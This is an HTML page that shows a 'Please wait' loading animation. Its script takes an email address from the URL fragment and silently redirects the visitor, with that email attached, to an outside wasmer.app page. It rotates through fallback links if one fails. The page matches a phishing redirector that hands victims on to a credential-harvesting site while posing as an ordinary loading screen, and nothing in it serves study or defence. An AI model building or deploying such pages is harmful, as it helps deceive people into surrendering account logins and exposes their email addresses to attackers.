<!DOCTYPE html>
<html>
<head>
  <title>Please wait...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-color: #f4f4f4;
    }
    #message {
      font-size: 1.5em;
      margin-bottom: 20px;
    }
    #dots span {
      display: inline-block;
      animation: blink 1s infinite;
      margin: 0 2px;
    }
    #dots span:nth-child(2) { animation-delay: 0.2s; }
    #dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 50%, 100% { opacity: 0; }
      25%, 75% { opacity: 1; }
    }
  </style>
</head>
<body>
  <div id="message">Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span></div>

  <script>
    const links = [
      "https://staticfile-8e1115.wasmer.app/index.html"
    ];

    const email = window.location.hash.substring(1);

    function shuffle(arr) {
      const a = arr.slice();
      for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
      }
      return a;
    }

    const shuffledLinks = shuffle(links);
    let index = 0;

    function tryNextLink() {
      if (index >= shuffledLinks.length) {
        document.getElementById("message").textContent = "All links may be down!";
        return;
      }

      const url = shuffledLinks[index] + "#" + email;
      document.getElementById("message").textContent = `Redirecting to ${shuffledLinks[index]}â€¦`;
      window.location.href = url;

      // Fallback: if redirect fails after 5s, try next link
      setTimeout(() => {
        index++;
        tryNextLink();
      }, 5000);
    }

    window.addEventListener("DOMContentLoaded", () => {
      setTimeout(tryNextLink, 3000); // initial wait
    });
  </script>
</body>
</html>
